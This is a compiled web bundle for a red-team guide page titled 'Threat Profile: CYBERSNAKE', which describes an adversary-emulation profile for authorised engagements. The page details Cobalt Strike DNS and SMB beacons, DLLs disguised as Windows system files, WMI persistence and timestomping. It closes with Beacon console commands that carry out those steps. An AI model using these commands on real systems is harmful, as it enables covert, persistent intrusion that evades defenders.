"use strict";(self.webpackChunkbs_support=self.webpackChunkbs_support||[]).push([[137],{3905:(e,t,r)=>{r.d(t,{Zo:()=>c,kt:()=>m});var a=r(7294);function i(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function n(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,a)}return r}function l(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?n(Object(r),!0).forEach((function(t){i(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):n(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function o(e,t){if(null==e)return{};var r,a,i=function(e,t){if(null==e)return{};var r,a,i={},n=Object.keys(e);for(a=0;a<n.length;a++)r=n[a],t.indexOf(r)>=0||(i[r]=e[r]);return i}(e,t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);for(a=0;a<n.length;a++)r=n[a],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(i[r]=e[r])}return i}var s=a.createContext({}),p=function(e){var t=a.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):l(l({},t),e)),r},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var r=e.components,i=e.mdxType,n=e.originalType,s=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),u=p(r),m=i,f=u["".concat(s,".").concat(m)]||u[m]||d[m]||n;return r?a.createElement(f,l(l({ref:t},c),{},{components:r})):a.createElement(f,l({ref:t},c))}));function m(e,t){var r=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var n=r.length,l=new Array(n);l[0]=u;var o={};for(var s in t)hasOwnProperty.call(t,s)&&(o[s]=t[s]);o.originalType=e,o.mdxType="string"==typeof e?e:i,l[1]=o;for(var p=2;p<n;p++)l[p]=r[p];return a.createElement.apply(null,l)}return a.createElement.apply(null,r)}u.displayName="MDXCreateElement"},6157:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>s,contentTitle:()=>l,default:()=>d,frontMatter:()=>n,metadata:()=>o,toc:()=>p});var a=r(7462),i=(r(7294),r(3905));const n={title:"Threat Profile: CYBERSNAKE",description:"CYBERSNAKE threat profile example\n"},l="Threat Profile (CYBERSNAKE)",o={unversionedId:"Threat Profiles/cybersnake",id:"Threat Profiles/cybersnake",title:"Threat Profile: CYBERSNAKE",description:"CYBERSNAKE threat profile example\n",source:"@site/docs/Threat Profiles/cybersnake.md",sourceDirName:"Threat Profiles",slug:"/Threat Profiles/cybersnake",permalink:"/redteamguide/docs/Threat Profiles/cybersnake",draft:!1,tags:[],version:"current",frontMatter:{title:"Threat Profile: CYBERSNAKE",description:"CYBERSNAKE threat profile example\n"},sidebar:"tutorialSidebar",previous:{title:"Threat Profile - BLUEHEART",permalink:"/redteamguide/docs/Threat Profiles/blueheart"},next:{title:"Threat Profile: SIMPLESAM",permalink:"/redteamguide/docs/Threat Profiles/simplesam"}},s={},p=[{value:"Description",id:"description",level:2},{value:"Characteristics",id:"characteristics",level:2},{value:"System Modifications",id:"system-modifications",level:2},{value:"Files",id:"files",level:3},{value:"SMB Payload",id:"smb-payload",level:4},{value:"DNS Payload",id:"dns-payload",level:4},{value:"Registry",id:"registry",level:2},{value:"WMI",id:"wmi",level:2},{value:"Deployment Steps",id:"deployment-steps",level:2},{value:"Persistence Steps (via CobaltStrike Beacon Console)",id:"persistence-steps-via-cobaltstrike-beacon-console",level:2}],c={toc:p};function d(e){let{components:t,...r}=e;return(0,i.kt)("wrapper",(0,a.Z)({},c,r,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"threat-profile-cybersnake"},"Threat Profile (CYBERSNAKE)"),(0,i.kt)("admonition",{type:"tip"},(0,i.kt)("p",{parentName:"admonition"},"A modified version of this profile was used on an assumed breach engagement. This profile is provide as an example to show details that supported a real engagement. A key focus of this profile is the use of DNS for C2. ")),(0,i.kt)("h2",{id:"description"},"Description"),(0,i.kt)("p",null,"C2 threat inspired by the Snake Campaign & Cyber Espionage Toolkit uses DNS instead of HTTP for communications"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Reference: ",(0,i.kt)("a",{parentName:"p",href:"http://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign"},"http://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign"))),(0,i.kt)("h2",{id:"characteristics"},"Characteristics"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"C2 Backend: CobaltStrike"),(0,i.kt)("li",{parentName:"ul"},"Port(s): 53, 445 (DNS, SMB)"),(0,i.kt)("li",{parentName:"ul"},"C2 communication using DNS and SMB Traffic"),(0,i.kt)("li",{parentName:"ul"},"Executes in browser only when browser is active"),(0,i.kt)("li",{parentName:"ul"},"IP communication using DNS hostnames")),(0,i.kt)("p",null,"Cobalt Strike HTTP Request Profile:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"None")),(0,i.kt)("h2",{id:"system-modifications"},"System Modifications"),(0,i.kt)("h3",{id:"files"},"Files"),(0,i.kt)("h4",{id:"smb-payload"},"SMB Payload"),(0,i.kt)("p",null,"PATH: ",(0,i.kt)("inlineCode",{parentName:"p"},"C:\\Windows\\System32\\KBDUS1.DLL")),(0,i.kt)("p",null,"Binary modified using a resource hacker to look similar to other Windows files "),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"File Description: United States Keyboard Layout Alternate"),(0,i.kt)("li",{parentName:"ul"},"File Version: 6.1.7601.17514"),(0,i.kt)("li",{parentName:"ul"},"Product Name: Microsoft(r) Windows(r) Operating System"),(0,i.kt)("li",{parentName:"ul"},"Product Version: 6.1.7601.17514"),(0,i.kt)("li",{parentName:"ul"},"Copyright: (c)Microsoft Corporation. All right reserved"),(0,i.kt)("li",{parentName:"ul"},"Date Modified:  11/20/2010 4:29:11 PM")),(0,i.kt)("h4",{id:"dns-payload"},"DNS Payload"),(0,i.kt)("p",null,"PATH: ",(0,i.kt)("inlineCode",{parentName:"p"},"c:\\windows\\system32\\wanAPI.dll")),(0,i.kt)("p",null,"Binary modified using a resource hacker to look similar to other Windows files"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"File Description: Mbnapi"),(0,i.kt)("li",{parentName:"ul"},"File Version: 6.1.7600.16385"),(0,i.kt)("li",{parentName:"ul"},"Product Name: Microsoft(r) Windows(r) Operating System"),(0,i.kt)("li",{parentName:"ul"},"Product Version: 6.1.7600.16385"),(0,i.kt)("li",{parentName:"ul"},"Copyright: (c)Microsoft Corporation. All right reserved"),(0,i.kt)("li",{parentName:"ul"},"Date Modified: 07/13/2009 7:56:53 PM")),(0,i.kt)("h2",{id:"registry"},"Registry"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"None")),(0,i.kt)("h2",{id:"wmi"},"WMI"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"SMB Beacon: WMI KBDMonitor Created containing start up code to launch a smb beacon at each reboot"),(0,i.kt)("li",{parentName:"ul"},"DNS Beacon: WMI MSUpdate Created containing start up code to launch a dns beacon at each reboot")),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"deployment-steps"},"Deployment Steps"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Create WMI script with file and path to payload"),(0,i.kt)("li",{parentName:"ol"},"Build payloads using profile"),(0,i.kt)("li",{parentName:"ol"},"Build 64 and 32 bit DLL files"),(0,i.kt)("li",{parentName:"ol"},"Use a Resource Hacker utility to modify dll to match File Attributes"),(0,i.kt)("li",{parentName:"ol"},"Deploy dll to target system"),(0,i.kt)("li",{parentName:"ol"},"Verify time matches surrounding files (TimeStomp if needed)")),(0,i.kt)("h2",{id:"persistence-steps-via-cobaltstrike-beacon-console"},"Persistence Steps (via CobaltStrike Beacon Console)"),(0,i.kt)("p",null,"KBDUS1.dll (SMB Beacon)"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'cd c:\\windows\\temp\nupload /data/PAYLOADS/fullstaged/64/KBDUS1.DLL\npowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1\npowershell Set-FileTimeStamps c:\\windows\\temp\\KBDUS1.DLL "11/20/2010 4:29:11 PM"\nshell move c:\\windows\\temp\\KBDUS1.DLL c:\\windows\\system32\npowershell-import /data/PAYLOADS/wmi_persistence_kbdus1.ps1\npowershell Invoke-WMI-Persistence\n')),(0,i.kt)("p",null,"wanAPI.dll (DNS Beacon)"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'cd c:\\windows\\temp\nupload /data/PAYLOADS/staged/wanAPI.dll\npowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1\npowershell Set-FileTimeStamps c:\\windows\\temp\\wanAPI.dll "07/13/2009 7:56:53 PM"\nshell move c:\\windows\\temp\\wanAPI.dll c:\\windows\\system32\npowershell-import /data/PAYLOADS/wmi_persistence_wanapi.ps1\npowershell Invoke-WMI-Persistence\n')))}d.isMDXComponent=!0}}]);